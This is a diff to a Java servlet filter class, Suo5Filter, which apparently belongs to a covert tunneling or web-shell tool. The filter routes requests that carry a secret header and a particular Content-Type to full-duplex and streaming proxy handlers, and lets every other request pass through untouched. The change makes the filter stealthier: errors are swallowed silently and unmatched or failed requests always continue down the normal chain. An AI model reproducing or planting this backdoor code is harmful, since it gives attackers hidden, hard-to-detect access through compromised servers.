@@ -45,31 +45,25 @@ public class Suo5Filter implements Filter, Runnable, HostnameVerifier, X509Trust
     public void doFilter(ServletRequest sReq, ServletResponse sResp, FilterChain chain) throws IOException, ServletException {
         HttpServletRequest request = (HttpServletRequest) sReq;
         HttpServletResponse response = (HttpServletResponse) sResp;
-        String contentType = request.getHeader("Content-Type");
-
-        if (request.getHeader(headerName) == null || !request.getHeader(headerName).contains(headerValue)) {
-            chain.doFilter(sReq, sResp);
-            return;
-        }
-        if (contentType == null) {
-            return;
-        }
-
         try {
-            if (contentType.equals("application/plain")) {
-                tryFullDuplex(request, response);
+            String contentType = request.getHeader("Content-Type");
+            if (request.getHeader(headerName) != null
+                    && request.getHeader(headerName).contains(headerValue)
+                    && contentType != null) {
+                if (contentType.equals("application/plain")) {
+                    tryFullDuplex(request, response);
+                    return;
+                }
+                if (contentType.equals("application/octet-stream")) {
+                    processDataBio(request, response);
+                } else {
+                    processDataUnary(request, response);
+                }
                 return;
             }
-
-            if (contentType.equals("application/octet-stream")) {
-                processDataBio(request, response);
-            } else {
-                processDataUnary(request, response);
-            }
-        } catch (Throwable e) {
-//                System.out.printf("process data error %s\n", e);
-//                e.printStackTrace();
+        } catch (Throwable ignored) {
         }
+        chain.doFilter(sReq, sResp);
     }
 
     public void readFull(InputStream is, byte[] b) throws IOException, InterruptedException {
